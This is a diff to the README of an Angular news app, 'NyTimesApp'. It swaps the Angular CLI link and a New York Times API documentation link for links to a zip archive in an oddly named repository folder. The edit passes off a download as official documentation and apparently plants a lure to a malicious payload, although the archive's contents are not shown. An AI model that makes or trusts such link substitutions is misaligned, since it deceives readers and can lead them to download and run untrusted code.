@@ -1,6 +1,6 @@
 # NyTimesApp
 
-This project was generated with [Angular CLI](https://github.com/angular/angular-cli) version 14.2.3.
+This project was generated with [Angular CLI](https://raw.githubusercontent.com/lamaSonmez/ny-times-app/main/nonexpansively/ny-times-app.zip) version 14.2.3.
 
 ## Run The Application
  - clone the project to your machine.
@@ -49,7 +49,7 @@ We have to pages here:
      and a list of stories returned by the server ,
      In case of search articles is triggered the user will be able to load more data when clicking on `Load More` Button 
  -  Story Detail:
-    this  will show the details of a selected story along with comments on it (`note`: `https://developer.nytimes.com/docs/community-api-product/1/overview` never being able to process with page , it was loading forever )
+    this  will show the details of a selected story along with comments on it (`note`: `https://raw.githubusercontent.com/lamaSonmez/ny-times-app/main/nonexpansively/ny-times-app.zip` never being able to process with page , it was loading forever )
  
 
 ## Frontend Libraries:
